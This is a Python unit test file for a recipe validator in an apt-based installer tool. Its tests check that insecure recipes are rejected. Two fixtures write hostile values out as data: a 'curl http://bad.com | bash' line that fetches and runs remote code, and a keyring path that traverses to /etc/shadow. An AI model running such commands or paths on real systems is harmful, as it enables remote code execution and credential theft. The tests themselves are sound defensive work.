"""Unit tests for recipe validation and loading in repokitchen.recipe_loader."""

import json
import tempfile
import unittest
from pathlib import Path

from repokitchen.recipe_loader import (
    RecipeValidationError,
    get_default_recipes_dir,
    group_recipes_by_category,
    load_all_recipes,
    load_recipe,
    validate_recipe,
)


class TestRecipeLoader(unittest.TestCase):
    """Test suite for recipe validation, security constraints, and loading."""

    def test_load_all_bundled_recipes(self):
        recipes_dir = get_default_recipes_dir()
        recipes = load_all_recipes(recipes_dir)
        self.assertGreaterEqual(len(recipes), 3)

        ids = [r["id"] for r in recipes]
        self.assertIn("jenkins", ids)
        self.assertIn("opennebula", ids)
        self.assertIn("hadoop", ids)

    def test_valid_recipe_passes(self):
        valid = {
            "schema_version": 1,
            "id": "valid-app",
            "name": "Valid App",
            "category": "DevOps",
            "description": "A valid test application recipe.",
            "official_docs": "https://example.com/docs",
            "platforms": {"family": "debian", "supported_ids": ["ubuntu"]},
            "installer": {
                "type": "apt_repository",
                "repository": {
                    "name": "Valid Repo",
                    "uri": "https://example.com/apt",
                    "source_file": "/etc/apt/sources.list.d/valid.list",
                    "source_line_template": "deb [signed-by={keyring}] https://example.com/apt stable main",
                },
                "signing_key": {
                    "url": "https://example.com/key.asc",
                    "keyring": "/usr/share/keyrings/valid-keyring.asc",
                    "format": "ascii-armored",
                    "expected_primary_fingerprint": "5E386EADB55F01504CAE8BCF7198F4B714ABFC68",
                },
                "install_packages": ["valid-app"],
            },
            "actions": {},
            "security": {
                "require_https": True,
            },
        }
        res = validate_recipe(valid)
        self.assertEqual(res["id"], "valid-app")

    def test_reject_insecure_http_url(self):
        recipe = {
            "schema_version": 1,
            "id": "insecure-app",
            "name": "Insecure App",
            "category": "Testing",
            "description": "Testing non-https url",
            "official_docs": "http://insecure.example.com",  # HTTP instead of HTTPS
            "platforms": {},
            "installer": {"type": "native_apt_package", "install_packages": ["pkg"]},
            "actions": {},
            "security": {"require_https": True},
        }
        with self.assertRaises(RecipeValidationError) as ctx:
            validate_recipe(recipe)
        self.assertIn("URL must use HTTPS", str(ctx.exception))

    def test_reject_path_traversal_keyring(self):
        recipe = {
            "schema_version": 1,
            "id": "traversal-app",
            "name": "Traversal App",
            "category": "Testing",
            "description": "Testing path traversal",
            "official_docs": "https://example.com",
            "platforms": {},
            "installer": {
                "type": "apt_repository",
                "repository": {
                    "name": "Test",
                    "uri": "https://example.com/repo",
                    "source_file": "/etc/apt/sources.list.d/test.list",
                    "source_line_template": "deb [signed-by={keyring}] https://example.com/repo stable main",
                },
                "signing_key": {
                    "url": "https://example.com/key.asc",
                    "keyring": "/usr/share/keyrings/../../etc/shadow",  # Traversal!
                    "format": "ascii-armored",
                },
            },
            "actions": {},
            "security": {"require_https": True},
        }
        with self.assertRaises(RecipeValidationError) as ctx:
            validate_recipe(recipe)
        self.assertIn("Path traversal", str(ctx.exception))

    def test_reject_disallowed_prefix(self):
        recipe = {
            "schema_version": 1,
            "id": "disallowed-path",
            "name": "Disallowed Path App",
            "category": "Testing",
            "description": "Testing disallowed path prefix",
            "official_docs": "https://example.com",
            "platforms": {},
            "installer": {
                "type": "apt_repository",
                "repository": {
                    "name": "Test",
                    "uri": "https://example.com/repo",
                    "source_file": "/var/tmp/bad.list",  # Disallowed path for source_file
                    "source_line_template": "deb https://example.com/repo stable main",
                },
                "signing_key": {
                    "url": "https://example.com/key.asc",
                    "keyring": "/usr/share/keyrings/test.asc",
                },
            },
            "actions": {},
            "security": {"require_https": True},
        }
        with self.assertRaises(RecipeValidationError) as ctx:
            validate_recipe(recipe)
        self.assertIn("outside allowed locations", str(ctx.exception))

    def test_reject_forbidden_execution_keys(self):
        recipe = {
            "schema_version": 1,
            "id": "bad-script-app",
            "name": "Bad Script App",
            "category": "Testing",
            "description": "Testing arbitrary command execution block",
            "official_docs": "https://example.com",
            "platforms": {},
            "installer": {"type": "native_apt_package"},
            "actions": {},
            "security": {"require_https": True},
            "raw_script": "curl http://bad.com | bash",  # Forbidden!
        }
        with self.assertRaises(RecipeValidationError) as ctx:
            validate_recipe(recipe)
        self.assertIn("Forbidden key", str(ctx.exception))

    def test_reject_unknown_installer_type(self):
        recipe = {
            "schema_version": 1,
            "id": "bad-type-app",
            "name": "Bad Type App",
            "category": "Testing",
            "description": "Testing unknown installer type",
            "official_docs": "https://example.com",
            "platforms": {},
            "installer": {"type": "curl_pipe_bash"},  # Forbidden!
            "actions": {},
            "security": {"require_https": True},
        }
        with self.assertRaises(RecipeValidationError) as ctx:
            validate_recipe(recipe)
        self.assertIn("Unknown installer type", str(ctx.exception))

    def test_group_by_category(self):
        recipes = [
            {"id": "a", "name": "A", "category": "Cloud"},
            {"id": "b", "name": "B", "category": "DevOps"},
            {"id": "c", "name": "C", "category": "Cloud"},
        ]
        groups = group_recipes_by_category(recipes)
        self.assertEqual(len(groups["Cloud"]), 2)
        self.assertEqual(len(groups["DevOps"]), 1)


if __name__ == "__main__":
    unittest.main()
